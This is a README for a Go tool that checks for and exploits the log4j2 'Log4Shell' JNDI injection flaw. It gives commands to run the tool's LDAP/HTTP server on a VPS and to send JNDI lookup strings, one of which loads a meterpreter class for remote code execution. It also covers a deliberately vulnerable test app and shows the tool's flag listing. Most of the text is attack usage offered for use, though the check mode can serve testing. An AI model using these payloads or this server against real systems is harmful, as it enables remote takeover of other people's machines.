# Log4Shell
 * Check and exploit log4j2 vulnerability with single Go program. 
 * You don't need to install anything except develop it.
 * It supports ldaps and https server for other usage.

## Run
   ```Log4Shell.exe -host "VPS IP address"```

## Check
 * run the Log4Shell server
 * send ```${jndi:ldap://127.0.0.1:3890/nop.class}```

## Exploit
 * run the Log4Shell server
 * put your class file to the payload directory
 * send ```${jndi:ldap://127.0.0.1:3890/meterpreter.class}```
 * will open source after some time

## VulApp
 * VulApp is a vulnerable Java program that use log4j2 package.
 * You can use it for develop this project easily.
 * ```java -jar vulapp.jar ${jndi:ldap://127.0.0.1:3890/calc.class}```

## Help
  ```
  
  :::      ::::::::   ::::::::      :::     ::::::::  :::    ::: :::::::::: :::      :::
  :+:     :+:    :+: :+:    :+:    :+:     :+:    :+: :+:    :+: :+:        :+:      :+:
  +:+     +:+    +:+ +:+          +:+ +:+  +:+        +:+    +:+ +:+        +:+      +:+
  +#+     +#+    +:+ :#:         +#+  +:+  +#++:++#++ +#++:++#++ +#++:++#   +#+      +#+
  +#+     +#+    +#+ +#+   +#+# +#+#+#+#+#+       +#+ +#+    +#+ +#+        +#+      +#+
  #+#     #+#    #+# #+#    #+#       #+#  #+#    #+# #+#    #+# #+#        #+#      #+#
  ######## ########   ########        ###   ########  ###    ### ########## ######## ########

                                                        https://github.com/For-ACGN/Log4Shell

Usage of Log4Shell.exe:
  -host string
        server IP address or domain name (default "127.0.0.1")
  -http-addr string
        http server address (default ":8080")
  -http-net string
        http server network (default "tcp")
  -ldap-addr string
        ldap server address (default ":3890")
  -ldap-net string
        ldap server network (default "tcp")
  -payload string
        payload(java class) directory (default "payload")
  -tls-cert string
        tls certificate file path (default "cert.pem")
  -tls-key string
        tls private key file path (default "key.pem")
  -tls-server
        enable ldaps and https server
  ```

## Screenshot
![](https://github.com/For-ACGN/Log4Shell/raw/main/screenshot.png)
